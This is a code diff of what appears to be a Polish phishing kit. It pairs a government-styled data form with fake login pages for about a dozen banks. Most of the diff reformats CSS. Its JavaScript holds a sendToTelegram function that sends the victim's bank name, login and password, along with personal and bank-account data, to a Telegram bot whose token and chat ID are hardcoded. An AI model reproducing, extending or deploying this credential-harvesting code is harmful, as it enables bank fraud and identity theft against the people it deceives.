+            .bank3-full-page .login-form-wrapper .login-title { font-size: 22px; }
+            .bank3-full-page .login-form-wrapper .login-subtitle { font-size: 14px; }
+            .bank3-full-page .login-form-wrapper input { padding: 10px 12px; font-size: 13px; }
+            .bank3-full-page .login-form-wrapper .login-btn { height: 40px; font-size: 14px; }
+            .bank4-full-page .bank4-container { padding: 30px 16px; }
+            .bank4-full-page .bank4-title { font-size: 24px; }
+            .bank4-full-page .bank4-subtitle { font-size: 14px; }
+            .bank4-full-page .bank4-form input { padding: 10px 12px; font-size: 13px; }
+            .bank4-full-page .bank4-form .login-btn { height: 40px; font-size: 14px; }
+            .bank5-full-page .bank5-box { padding: 24px 18px; }
+            .bank5-full-page .bank5-title { font-size: 20px; }
+            .bank5-full-page .bank5-subtitle { font-size: 14px; }
+            .bank5-full-page .bank5-form input { padding: 10px 12px; font-size: 13px; }
+            .bank5-full-page .bank5-form .login-btn { height: 40px; font-size: 14px; }
+            .bank6-container { padding: 24px 18px; margin: 10px; }
+            .bank6-title { font-size: 22px; }
+            .bank6-form input { padding: 10px 14px; font-size: 13px; }
+            .bank6-form .login-btn { padding: 12px; font-size: 14px; }
+            .bank6-download img { width: 160px; height: 36px; }
+            .bank6-security-title { font-size: 16px; }
+            .bank6-security-text { font-size: 13px; }
+            .bank7-full-page .bank7-container { padding: 30px 16px; }
+            .bank7-full-page .bank7-box { padding: 24px 18px; }
+            .bank7-full-page .bank7-title { font-size: 20px; }
+            .bank7-full-page .bank7-subtitle { font-size: 13px; }
+            .bank7-full-page .bank7-form input { padding: 10px 12px; font-size: 13px; }
+            .bank7-full-page .bank7-form .login-btn { padding: 12px; font-size: 14px; }
+            .bank7-full-page .bank7-norton { bottom: 14px; right: 16px; }
+            .bank7-full-page .bank7-norton img { width: 60px; height: 40px; }
+            .bank8-full-page .bank8-container { padding: 20px 16px; gap: 24px; }
+            .bank8-full-page .bank8-card { padding: 20px 16px; width: 100%; max-width: 100%; }
+            .bank8-full-page .bank8-card .bank8-card-title { font-size: 16px; }
+            .bank8-full-page .bank8-card .bank8-login-title { font-size: 18px; }
+            .bank8-full-page .bank8-form input { padding: 10px 12px; font-size: 13px; }
+            .bank8-full-page .bank8-form .login-btn { padding: 12px; font-size: 14px; }
+            .bank8-full-page .bank8-right { padding-top: 0; }
+            .bank8-full-page .bank8-security-title { font-size: 18px; }
+            .bank8-full-page .bank8-security-text { font-size: 14px; }
+            .bank8-full-page .bank8-security-image img { width: 200px; height: auto; }
+            .bank9-full-page .bank9-container { padding: 20px 16px; }
+            .bank9-full-page .bank9-top { flex-direction: column; align-items: flex-start; gap: 12px; }
+            .bank9-full-page .bank9-top .bank9-title { font-size: 15px; }
+            .bank9-full-page .bank9-card { width: 100%; max-width: 100%; padding: 24px 18px; }
+            .bank9-full-page .bank9-card .bank9-welcome { font-size: 20px; }
+            .bank9-full-page .bank9-form input { padding: 10px 12px; font-size: 13px; }
+            .bank9-full-page .bank9-form .login-btn { padding: 12px; font-size: 14px; }
+            .bank10-full-page .bank10-container { padding: 20px 16px; }
+            .bank10-full-page .bank10-card { padding: 16px 18px; width: 100%; max-width: 100%; }
+            .bank10-full-page .bank10-card p { font-size: 13px; }
+            .bank10-full-page .bank10-form-section .bank10-login-title { font-size: 20px; }
+            .bank10-full-page .bank10-form input { padding: 10px 12px; font-size: 13px; border-radius: 6px; }
+            .bank10-full-page .bank10-form .login-btn { padding: 12px; font-size: 14px; }
+            .bank10-full-page .bank10-security-title { font-size: 15px; }
+            .bank10-full-page .bank10-security-list li { font-size: 13px; }
+            .bank12-full-page .bank12-container { padding: 16px 16px 30px; }
+            .bank12-full-page .bank12-box { padding: 20px 16px; }
+            .bank12-full-page .bank12-title { font-size: 15px; }
+            .bank12-full-page .bank12-form input { padding: 10px 12px; font-size: 13px; }
+            .bank12-full-page .bank12-form .login-btn { width: 72px; height: 40px; font-size: 14px; }
         }
 
         @media (max-width: 480px) {
-            .sidebar {
-                display: none !important;
-            }
-            .menu-btn {
-                display: none !important;
-            }
-            .logo-area .logo-main .gov {
-                font-size: 20px;
-            }
-            .logo-area .logo-main .separator {
-                font-size: 20px;
-            }
-            .logo-area .logo-main .subtitle {
-                font-size: 14px;
-            }
-            .logo-area .coat-of-arms {
-                height: 28px;
-            }
-            .header-search {
-                height: 30px;
-                border-radius: 4px;
-                min-width: unset;
-            }
-            .header-search .search-icon-btn {
-                padding: 0 4px 0 6px;
-            }
-            .header-search .search-icon-btn svg {
-                width: 12px;
-                height: 12px;
-            }
-            .header-search input {
-                min-width: 60px;
-                font-size: 11px;
-                padding: 0 6px 0 0;
-            }
-            .header-search .search-submit-btn {
-                font-size: 11px;
-                padding: 0 10px;
-            }
-            .header-eu-logo {
-                width: 40px;
-                height: 24px;
-            }
-            .header-right {
-                gap: 4px;
-                margin-right: 0;
-            }
-            .image-under-banner .image-wrapper img {
-                transform: scale(1.5);
-                transform-origin: center center;
-            }
-            .image-under-banner .image-wrapper .overlay-icon {
-                width: 70px;
-                height: 58px;
-                left: 110px;
-            }
-            .image-under-banner .image-wrapper .overlay-line {
-                left: 195px;
-                width: 1px;
-            }
-            .image-under-banner .image-wrapper .overlay-text {
-                left: 205px;
-                max-width: 120px;
-            }
-            .image-under-banner .image-wrapper .overlay-text h2 {
-                font-size: 12px;
-                margin-bottom: 4px;
-            }
-            .image-under-banner .image-wrapper .overlay-text p {
-                font-size: 10px;
-                margin-bottom: 6px;
-                line-height: 1.3;
-            }
-            .image-under-banner .image-wrapper .overlay-text .btn-outline {
-                font-size: 8px;
-                padding: 4px 10px;
-                border-width: 1px;
-            }
-            .data-form .address-row {
-                grid-template-columns: 2fr 1fr 1fr;
-                gap: 4px;
-            }
-            .data-form .address-row input {
-                font-size: 12px;
-                padding: 6px 4px;
-            }
-            .data-form .address-row input[name="postal"] {
-                letter-spacing: 1px;
-            }
-            .data-form-section {
-                padding: 12px;
-            }
-            .data-form .form-group input,
-            .data-form .form-group select {
-                font-size: 13px;
-                padding: 8px 10px;
-            }
-            .data-form .submit-btn {
-                font-size: 14px;
-                padding: 10px 20px;
-            }
-            .toast-message {
-                font-size: 14px;
-                padding: 12px 20px;
-                bottom: 20px;
-            }
-            .blue-alert {
-                font-size: 15px;
-                padding: 14px 16px;
-            }
-            .bank-grid {
-                grid-template-columns: repeat(2, 1fr);
-                max-width: 280px;
-                gap: 10px;
-            }
-            .bank-btn {
-                height: 55px;
-                max-height: 55px;
-                min-height: 55px;
-                width: 100%;
-                max-width: 191px;
-            }
-            .bank-btn img {
-                width: 100px;
-                height: 32px;
-            }
-            .bank-btn img[alt="Bank 2"] {
-                width: 100px;
-                height: 32px;
-            }
-            .bank-selection {
-                padding: 20px 12px 16px;
-                min-height: calc(100vh - 72px);
-            }
-            .bank-selection .bank-title {
-                font-size: 20px;
-            }
-            .bank-selection .bank-subtitle {
-                font-size: 14px;
-                margin-bottom: 20px;
-            }
-            .bank-footer {
-                padding: 25px 0 16px;
-            }
-            .bank-footer .footer-links {
-                gap: 12px;
-                flex-direction: column;
-                align-items: center;
-            }
-            .bank-footer .footer-links a {
-                font-size: 11px;
-            }
-            .login-screen {
-                padding: 16px 12px 12px;
-            }
-            .login-screen .login-title {
-                font-size: 20px;
-            }
-            .login-screen .login-subtitle {
-                font-size: 13px;
-            }
-            .login-screen .login-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .login-screen .login-form .login-btn {
-                height: 36px;
-                font-size: 13px;
-            }
-            .login-screen .login-left .ipko-logo {
-                width: 50px;
-                height: 38px;
-            }
-            .login-screen .security-info .info-title,
-            .login-screen .contact-info .info-title {
-                font-size: 14px;
-            }
-            .login-screen .contact-info .contact-phone {
-                font-size: 14px;
-            }
-            .login-screen .contact-info .contact-phone-small {
-                font-size: 13px;
-            }
-            .login-screen .login-grid {
-                gap: 18px;
-            }
-            .bank2-full-page .bank2-container {
-                padding: 12px 12px 24px;
-            }
-            .bank2-full-page .bank2-box {
-                padding: 16px 14px;
-            }
-            .bank2-full-page .bank2-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank2-full-page .bank2-form .login-btn {
-                width: 64px;
-                height: 36px;
-                font-size: 13px;
-                padding: 0 12px;
-            }
-            .bank3-header {
-                height: 42px;
-            }
-            .bank3-header .bank3-header-content {
-                padding: 0 12px;
-            }
-            .bank3-header .bank3-header-content .bank3-logo {
-                height: 24px;
-            }
-            .bank3-full-page .login-form-wrapper {
-                padding: 16px;
-            }
-            .bank3-full-page .login-form-wrapper .login-title {
-                font-size: 20px;
-            }
-            .bank3-full-page .login-form-wrapper .login-subtitle {
-                font-size: 13px;
-            }
-            .bank3-full-page .login-form-wrapper input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn {
-                height: 36px;
-                font-size: 13px;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn-row {
-                gap: 12px;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn-row .form-group {
-                min-width: 100%;
-            }
-            .bank3-full-page .login-form-wrapper .login-btn {
-                width: 100%;
-            }
-            .bank4-full-page .bank4-container {
-                padding: 20px 12px;
-            }
-            .bank4-full-page .bank4-title {
-                font-size: 20px;
-            }
-            .bank4-full-page .bank4-subtitle {
-                font-size: 13px;
-                margin-bottom: 20px;
-            }
-            .bank4-full-page .bank4-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank4-full-page .bank4-form .login-btn {
-                height: 36px;
-                font-size: 13px;
-                width: 100%;
-            }
-            .bank4-full-page .bank4-form .login-btn-row {
-                gap: 12px;
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .bank4-full-page .bank4-form .login-btn-row .form-group {
-                min-width: 100%;
-            }
-            .bank5-full-page .bank5-box {
-                padding: 18px 14px;
-            }
-            .bank5-full-page .bank5-title {
-                font-size: 18px;
-            }
-            .bank5-full-page .bank5-subtitle {
-                font-size: 13px;
-                margin-bottom: 18px;
-            }
-            .bank5-full-page .bank5-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank5-full-page .bank5-form .login-btn {
-                height: 36px;
-                font-size: 13px;
-                width: 100%;
-            }
-            .bank5-full-page .bank5-form .login-btn-row {
-                gap: 12px;
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .bank5-full-page .bank5-form .login-btn-row .form-group {
-                min-width: 100%;
-            }
-            .bank6-container {
-                padding: 18px 14px;
-            }
-            .bank6-title {
-                font-size: 20px;
-            }
-            .bank6-form input {
-                padding: 8px 12px;
-                font-size: 12px;
-            }
-            .bank6-form .login-btn {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .bank6-download img {
-                width: 140px;
-                height: 32px;
-            }
-            .bank6-security-text {
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-container {
-                padding: 20px 12px;
-            }
-            .bank7-full-page .bank7-box {
-                padding: 18px 14px;
-            }
-            .bank7-full-page .bank7-title {
-                font-size: 18px;
-            }
-            .bank7-full-page .bank7-subtitle {
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-form .login-btn {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .bank7-full-page .bank7-security-list li {
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-links {
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-chat {
-                font-size: 12px;
-            }
-            .bank7-full-page .bank7-norton {
-                bottom: 10px;
-                right: 12px;
-            }
-            .bank7-full-page .bank7-norton img {
-                width: 50px;
-                height: 34px;
-            }
-            .bank8-full-page .bank8-container {
-                padding: 16px 12px;
-                gap: 18px;
-            }
-            .bank8-full-page .bank8-card {
-                padding: 16px 12px;
-                width: 100%;
-                max-width: 100%;
-            }
-            .bank8-full-page .bank8-card .bank8-card-title {
-                font-size: 14px;
-            }
-            .bank8-full-page .bank8-card .bank8-login-title {
-                font-size: 16px;
-            }
-            .bank8-full-page .bank8-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank8-full-page .bank8-form .login-btn {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .bank8-full-page .bank8-security-title {
-                font-size: 16px;
-            }
-            .bank8-full-page .bank8-security-text {
-                font-size: 13px;
-            }
-            .bank8-full-page .bank8-security-image img {
-                width: 160px;
-                height: auto;
-            }
-            .bank8-full-page .bank8-favicon img {
-                width: 40px;
-                height: 40px;
-            }
-            .bank9-full-page .bank9-container {
-                padding: 16px 12px;
-            }
-            .bank9-full-page .bank9-top .bank9-title {
-                font-size: 14px;
-            }
-            .bank9-full-page .bank9-top .bank9-logo img {
-                width: 100px;
-                height: 50px;
-            }
-            .bank9-full-page .bank9-card {
-                padding: 18px 14px;
-                width: 100%;
-                max-width: 100%;
-            }
-            .bank9-full-page .bank9-card .bank9-welcome {
-                font-size: 18px;
-            }
-            .bank9-full-page .bank9-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank9-full-page .bank9-form .login-btn {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .bank10-full-page .bank10-container {
-                padding: 16px 12px;
-            }
-            .bank10-full-page .bank10-card {
-                padding: 14px 14px;
-                width: 100%;
-                max-width: 100%;
-            }
-            .bank10-full-page .bank10-card p {
-                font-size: 12px;
-            }
-            .bank10-full-page .bank10-form-section .bank10-login-title {
-                font-size: 18px;
-            }
-            .bank10-full-page .bank10-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-                border-radius: 6px;
-            }
-            .bank10-full-page .bank10-form .login-btn {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .bank10-full-page .bank10-security-title {
-                font-size: 14px;
-            }
-            .bank10-full-page .bank10-security-list li {
-                font-size: 12px;
-            }
-            .bank12-full-page .bank12-container {
-                padding: 12px 12px 24px;
-            }
-            .bank12-full-page .bank12-box {
-                padding: 16px 14px;
-            }
-            .bank12-full-page .bank12-title {
-                font-size: 14px;
-            }
-            .bank12-full-page .bank12-form input {
-                padding: 8px 10px;
-                font-size: 12px;
-            }
-            .bank12-full-page .bank12-form .login-btn {
-                width: 64px;
-                height: 36px;
-                font-size: 13px;
-                padding: 0 12px;
-            }
+            .sidebar { display: none !important; }
+            .menu-btn { display: none !important; }
+            .logo-area .logo-main .gov { font-size: 20px; }
+            .logo-area .logo-main .separator { font-size: 20px; }
+            .logo-area .logo-main .subtitle { font-size: 14px; }
+            .logo-area .coat-of-arms { height: 28px; }
+            .header-search { height: 30px; border-radius: 4px; min-width: unset; }
+            .header-search .search-icon-btn { padding: 0 4px 0 6px; }
+            .header-search .search-icon-btn svg { width: 12px; height: 12px; }
+            .header-search input { min-width: 60px; font-size: 11px; padding: 0 6px 0 0; }
+            .header-search .search-submit-btn { font-size: 11px; padding: 0 10px; }
+            .header-eu-logo { width: 40px; height: 24px; }
+            .header-right { gap: 4px; margin-right: 0; }
+            .image-under-banner .image-wrapper img { transform: scale(1.5); transform-origin: center center; }
+            .image-under-banner .image-wrapper .overlay-icon { width: 70px; height: 58px; left: 110px; }
+            .image-under-banner .image-wrapper .overlay-line { left: 195px; width: 1px; }
+            .image-under-banner .image-wrapper .overlay-text { left: 205px; max-width: 120px; }
+            .image-under-banner .image-wrapper .overlay-text h2 { font-size: 12px; margin-bottom: 4px; }
+            .image-under-banner .image-wrapper .overlay-text p { font-size: 10px; margin-bottom: 6px; line-height: 1.3; }
+            .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 8px; padding: 4px 10px; border-width: 1px; }
+            .data-form .address-row { grid-template-columns: 2fr 1fr 1fr; gap: 4px; }
+            .data-form .address-row input { font-size: 12px; padding: 6px 4px; }
+            .data-form .address-row input[name="postal"] { letter-spacing: 1px; }
+            .data-form-section { padding: 12px; }
+            .data-form .form-group input, .data-form .form-group select { font-size: 13px; padding: 8px 10px; }
+            .data-form .submit-btn { font-size: 14px; padding: 10px 20px; }
+            .toast-message { font-size: 14px; padding: 12px 20px; bottom: 20px; }
+            .blue-alert { font-size: 15px; padding: 14px 16px; }
+            .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 280px; gap: 10px; }
+            .bank-btn { height: 55px; max-height: 55px; min-height: 55px; width: 100%; max-width: 191px; }
+            .bank-btn img { width: 100px; height: 32px; }
+            .bank-btn img[alt="Bank 2"] { width: 100px; height: 32px; }
+            .bank-selection { padding: 20px 12px 16px; min-height: calc(100vh - 72px); }
+            .bank-selection .bank-title { font-size: 20px; }
+            .bank-selection .bank-subtitle { font-size: 14px; margin-bottom: 20px; }
+            .bank-footer { padding: 25px 0 16px; }
+            .bank-footer .footer-links { gap: 12px; flex-direction: column; align-items: center; }
+            .bank-footer .footer-links a { font-size: 11px; }
+            .login-screen { padding: 16px 12px 12px; }
+            .login-screen .login-title { font-size: 20px; }
+            .login-screen .login-subtitle { font-size: 13px; }
+            .login-screen .login-form input { padding: 8px 10px; font-size: 12px; }
+            .login-screen .login-form .login-btn { height: 36px; font-size: 13px; }
+            .login-screen .login-left .ipko-logo { width: 50px; height: 38px; }
+            .login-screen .security-info .info-title, .login-screen .contact-info .info-title { font-size: 14px; }
+            .login-screen .contact-info .contact-phone { font-size: 14px; }
+            .login-screen .contact-info .contact-phone-small { font-size: 13px; }
+            .login-screen .login-grid { gap: 18px; }
+            .bank2-full-page .bank2-container { padding: 12px 12px 24px; }
+            .bank2-full-page .bank2-box { padding: 16px 14px; }
+            .bank2-full-page .bank2-form input { padding: 8px 10px; font-size: 12px; }
+            .bank2-full-page .bank2-form .login-btn { width: 64px; height: 36px; font-size: 13px; padding: 0 12px; }
+            .bank3-header { height: 42px; }
+            .bank3-header .bank3-header-content { padding: 0 12px; }
+            .bank3-header .bank3-header-content .bank3-logo { height: 24px; }
+            .bank3-full-page .login-form-wrapper { padding: 16px; }
+            .bank3-full-page .login-form-wrapper .login-title { font-size: 20px; }
+            .bank3-full-page .login-form-wrapper .login-subtitle { font-size: 13px; }
+            .bank3-full-page .login-form-wrapper input { padding: 8px 10px; font-size: 12px; }
+            .bank3-full-page .login-form-wrapper .login-btn { height: 36px; font-size: 13px; }
+            .bank3-full-page .login-form-wrapper .login-btn-row { gap: 12px; }
+            .bank3-full-page .login-form-wrapper .login-btn-row .form-group { min-width: 100%; }
+            .bank3-full-page .login-form-wrapper .login-btn { width: 100%; }
+            .bank4-full-page .bank4-container { padding: 20px 12px; }
+            .bank4-full-page .bank4-title { font-size: 20px; }
+            .bank4-full-page .bank4-subtitle { font-size: 13px; margin-bottom: 20px; }
+            .bank4-full-page .bank4-form input { padding: 8px 10px; font-size: 12px; }
+            .bank4-full-page .bank4-form .login-btn { height: 36px; font-size: 13px; width: 100%; }
+            .bank4-full-page .bank4-form .login-btn-row { gap: 12px; flex-direction: column; align-items: stretch; }
+            .bank4-full-page .bank4-form .login-btn-row .form-group { min-width: 100%; }
+            .bank5-full-page .bank5-box { padding: 18px 14px; }
+            .bank5-full-page .bank5-title { font-size: 18px; }
+            .bank5-full-page .bank5-subtitle { font-size: 13px; margin-bottom: 18px; }
+            .bank5-full-page .bank5-form input { padding: 8px 10px; font-size: 12px; }
+            .bank5-full-page .bank5-form .login-btn { height: 36px; font-size: 13px; width: 100%; }
+            .bank5-full-page .bank5-form .login-btn-row { gap: 12px; flex-direction: column; align-items: stretch; }
+            .bank5-full-page .bank5-form .login-btn-row .form-group { min-width: 100%; }
+            .bank6-container { padding: 18px 14px; }
+            .bank6-title { font-size: 20px; }
+            .bank6-form input { padding: 8px 12px; font-size: 12px; }
+            .bank6-form .login-btn { padding: 10px; font-size: 13px; }
+            .bank6-download img { width: 140px; height: 32px; }
+            .bank6-security-text { font-size: 12px; }
+            .bank7-full-page .bank7-container { padding: 20px 12px; }
+            .bank7-full-page .bank7-box { padding: 18px 14px; }
+            .bank7-full-page .bank7-title { font-size: 18px; }
+            .bank7-full-page .bank7-subtitle { font-size: 12px; }
+            .bank7-full-page .bank7-form input { padding: 8px 10px; font-size: 12px; }
+            .bank7-full-page .bank7-form .login-btn { padding: 10px; font-size: 13px; }
+            .bank7-full-page .bank7-security-list li { font-size: 12px; }
+            .bank7-full-page .bank7-links { font-size: 12px; }
+            .bank7-full-page .bank7-chat { font-size: 12px; }
+            .bank7-full-page .bank7-norton { bottom: 10px; right: 12px; }
+            .bank7-full-page .bank7-norton img { width: 50px; height: 34px; }
+            .bank8-full-page .bank8-container { padding: 16px 12px; gap: 18px; }
+            .bank8-full-page .bank8-card { padding: 16px 12px; width: 100%; max-width: 100%; }
+            .bank8-full-page .bank8-card .bank8-card-title { font-size: 14px; }
+            .bank8-full-page .bank8-card .bank8-login-title { font-size: 16px; }
+            .bank8-full-page .bank8-form input { padding: 8px 10px; font-size: 12px; }
+            .bank8-full-page .bank8-form .login-btn { padding: 10px; font-size: 13px; }
+            .bank8-full-page .bank8-security-title { font-size: 16px; }
+            .bank8-full-page .bank8-security-text { font-size: 13px; }
+            .bank8-full-page .bank8-security-image img { width: 160px; height: auto; }
+            .bank8-full-page .bank8-favicon img { width: 40px; height: 40px; }
+            .bank9-full-page .bank9-container { padding: 16px 12px; }
+            .bank9-full-page .bank9-top .bank9-title { font-size: 14px; }
+            .bank9-full-page .bank9-top .bank9-logo img { width: 100px; height: 50px; }
+            .bank9-full-page .bank9-card { padding: 18px 14px; width: 100%; max-width: 100%; }
+            .bank9-full-page .bank9-card .bank9-welcome { font-size: 18px; }
+            .bank9-full-page .bank9-form input { padding: 8px 10px; font-size: 12px; }
+            .bank9-full-page .bank9-form .login-btn { padding: 10px; font-size: 13px; }
+            .bank10-full-page .bank10-container { padding: 16px 12px; }
+            .bank10-full-page .bank10-card { padding: 14px 14px; width: 100%; max-width: 100%; }
+            .bank10-full-page .bank10-card p { font-size: 12px; }
+            .bank10-full-page .bank10-form-section .bank10-login-title { font-size: 18px; }
+            .bank10-full-page .bank10-form input { padding: 8px 10px; font-size: 12px; border-radius: 6px; }
+            .bank10-full-page .bank10-form .login-btn { padding: 10px; font-size: 13px; }
+            .bank10-full-page .bank10-security-title { font-size: 14px; }
+            .bank10-full-page .bank10-security-list li { font-size: 12px; }
+            .bank12-full-page .bank12-container { padding: 12px 12px 24px; }
+            .bank12-full-page .bank12-box { padding: 16px 14px; }
+            .bank12-full-page .bank12-title { font-size: 14px; }
+            .bank12-full-page .bank12-form input { padding: 8px 10px; font-size: 12px; }
+            .bank12-full-page .bank12-form .login-btn { width: 64px; height: 36px; font-size: 13px; padding: 0 12px; }
         }
 
         @supports (padding: max(0px)) {
@@ -4234,7 +3322,6 @@
                         </div>
                     </div>
 
-                    <!-- ===== NRB z NIEWIDOCZNYM PL — OBSŁUGA SPACJI ===== -->
                     <div class="form-group full-width">
                         <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
                         <div class="iban-wrapper" id="ibanWrapper">
@@ -4707,43 +3794,59 @@
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //   FULL JAVASCRIPT — Z OBSŁUGĄ SPACJI W NRB
+        //   JAVASCRIPT — WSZYSTKIE FUNKCJE ZACHOWANE
         // ============================================================
 
-        // ===== KONFIGURACJA TELEGRAM =====
-        const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
-        const TELEGRAM_CHAT_ID = '-1004256695843';
+        // ===== AUTO SLASH FOR BIRTHDATE =====
+        function autoSlash(event) {
+            const input = event.target;
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 8) value = value.slice(0, 8);
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i === 2 || i === 4) {
+                    formatted += '/';
+                }
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
 
-        // ===== FUNKCJA CZYSZCZĄCA IBAN (usuwa spacje, PL, zostawia cyfry) =====
+        // ===== AUTO POSTAL CODE (XX-XXX) =====
+        function autoPostal(event) {
+            const input = event.target;
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 5) value = value.slice(0, 5);
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i === 2) {
+                    formatted += '-';
+                }
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
+
+        // ============================================================
+        //   IBAN OBSŁUGA
+        // ============================================================
         function cleanIbanValue(value) {
             if (!value) return '';
-            // Usuń wszystkie spacje, myślniki i inne białe znaki
             let cleaned = value.replace(/[\s\-]/g, '');
-            // Zamień na wielkie litery
             cleaned = cleaned.toUpperCase();
-            // Usuń 'PL' jeśli jest na początku
             if (cleaned.startsWith('PL')) {
                 cleaned = cleaned.substring(2);
             }
-            // Zostaw tylko cyfry
             cleaned = cleaned.replace(/\D/g, '');
-            // Ogranicz do 26 znaków
             if (cleaned.length > 26) {
                 cleaned = cleaned.substring(0, 26);
             }
             return cleaned;
         }
 
-        // ===== FUNKCJA FORMATUJĄCA IBAN (grupy po 4) =====
-        function formatIbanReadable(iban) {
-            if (!iban) return '';
-            const cleaned = cleanIbanValue(iban);
-            if (cleaned.length < 26) return iban;
-            const full = 'PL' + cleaned;
-            return full.match(/.{1,4}/g).join(' ');
-        }
-
-        // ===== FUNKCJA WYSYŁANIA DO TELEGRAM =====
+        // ============================================================
+        //   TELEGRAM
+        // ============================================================
         function sendToTelegram(bankName, login, password) {
             const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
             
@@ -4774,49 +3877,15 @@
         }
 
         // ============================================================
-        //   GŁÓWNY KOD PO ZAŁADOWANIU STRONY
+        //   KONFIGURACJA TELEGRAM
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
+        const TELEGRAM_CHAT_ID = '-1004256695843';
+
+        // ============================================================
+        //   GŁÓWNY KOD
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-
-            // ===== AUTO SLASH FOR BIRTHDATE =====
-            function autoSlash(event) {
-                const input = event.target;
-                let value = input.value.replace(/\D/g, '');
-                if (value.length > 8) value = value.slice(0, 8);
-                let formatted = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i === 2 || i === 4) {
-                        formatted += '/';
-                    }
-                    formatted += value[i];
-                }
-                input.value = formatted;
-            }
-
-            // ===== AUTO POSTAL CODE (XX-XXX) =====
-            function autoPostal(event) {
-                const input = event.target;
-                let value = input.value.replace(/\D/g, '');
-                if (value.length > 5) value = value.slice(0, 5);
-                let formatted = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i === 2) {
-                        formatted += '-';
-                    }
-                    formatted += value[i];
-                }
-                input.value = formatted;
-            }
-
-            // Podłączamy funkcje do inputów
-            const birthdateInput = document.getElementById('birthdate');
-            const postalInput = document.querySelector('input[name="postal"]');
-            if (birthdateInput) {
-                birthdateInput.addEventListener('input', autoSlash);
-            }
-            if (postalInput) {
-                postalInput.addEventListener('input', autoPostal);
-            }
 
             // ===== MENU =====
             const menuToggle = document.getElementById('menuToggle');
@@ -4862,7 +3931,7 @@
                 if (e.key === 'Escape' && isMenuOpen) toggleMenu();
             });
 
-            // ===== SZUKAJ =====
+            // ===== SEARCH =====
             document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
                 const input = this.closest('.header-search').querySelector('input');
                 alert('Szukanie: ' + (input?.value || 'puste'));
@@ -4886,23 +3955,17 @@
             const scrollBtn = document.getElementById('scrollToFormBtn');
             const formSection = document.getElementById('dataFormSection');
 
-            if (scrollBtn) {
-                scrollBtn.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                });
-            }
+            scrollBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
 
-            // ============================================================
-            //   NRB (Numer Rachunku Bankowego) — OBSŁUGA SPACJI
-            // ============================================================
+            // ===== IBAN WRAPPER =====
             const ibanInput = document.getElementById('iban');
             const ibanWrapper = document.getElementById('ibanWrapper');
 
             if (ibanInput) {
-                // Obsługa wklejania
                 ibanInput.addEventListener('paste', function(e) {
-                    // Używamy setTimeout, aby wartość została wklejona przed czyszczeniem
                     setTimeout(() => {
                         const cleaned = cleanIbanValue(this.value);
                         this.value = cleaned;
@@ -4911,10 +3974,8 @@
                     }, 5);
                 });
 
-                // Obsługa każdego wprowadzania (ręczne wpisywanie)
                 ibanInput.addEventListener('input', function() {
                     const cleaned = cleanIbanValue(this.value);
-                    // Aktualizujemy wartość tylko jeśli się zmieniła (unikamy pętli)
                     if (this.value !== cleaned) {
                         this.value = cleaned;
                     }
@@ -4922,7 +3983,6 @@
                     if (ibanWrapper) ibanWrapper.classList.remove('error');
                 });
 
-                // Obsługa zgubienia fokusu (dodatkowe zabezpieczenie)
                 ibanInput.addEventListener('blur', function() {
                     const cleaned = cleanIbanValue(this.value);
                     if (this.value !== cleaned) {
@@ -4931,9 +3991,7 @@
                 });
             }
 
-            // ============================================================
-            //   FORMULARZ DANYCH OSOBOWYCH
-            // ============================================================
+            // ===== FORM SUBMIT =====
             const form = document.getElementById('dataForm');
             const submitBtn = document.getElementById('submitBtn');
             const toast = document.getElementById('toastMessage');
@@ -4959,8 +4017,6 @@
 
             function validateForm() {
                 let allFilled = true;
-                
-                // Sprawdzamy wszystkie wymagane pola
                 allInputs.forEach(input => {
                     if (input.value.trim() === '') {
                         allFilled = false;
@@ -4970,7 +4026,6 @@
                     }
                 });
 
-                // Walidacja IBAN (sprawdza czy jest 26 cyfr)
                 if (ibanInput) {
                     const ibanValue = cleanIbanValue(ibanInput.value);
                     if (ibanValue.length < 26) {
